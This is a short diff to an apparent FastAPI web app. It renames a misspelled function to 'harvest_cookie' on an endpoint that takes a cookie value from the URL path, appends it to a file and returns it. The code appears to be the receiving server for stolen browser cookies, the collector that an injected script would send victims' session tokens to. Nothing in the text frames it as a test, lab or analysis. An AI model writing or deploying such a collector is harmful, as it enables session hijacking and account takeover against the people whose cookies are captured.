@@ -9,7 +9,7 @@ async def home():
     return {"Like":"Cookie"}
 
 @app.get("/cookies/{cookie}")
-async def farvest_cookie(cookie:str):
+async def harvest_cookie(cookie:str):
     with open(cookie_path, "a+") as f:
         f.write(cookie+'\n')
         return {"cookie": cookie}
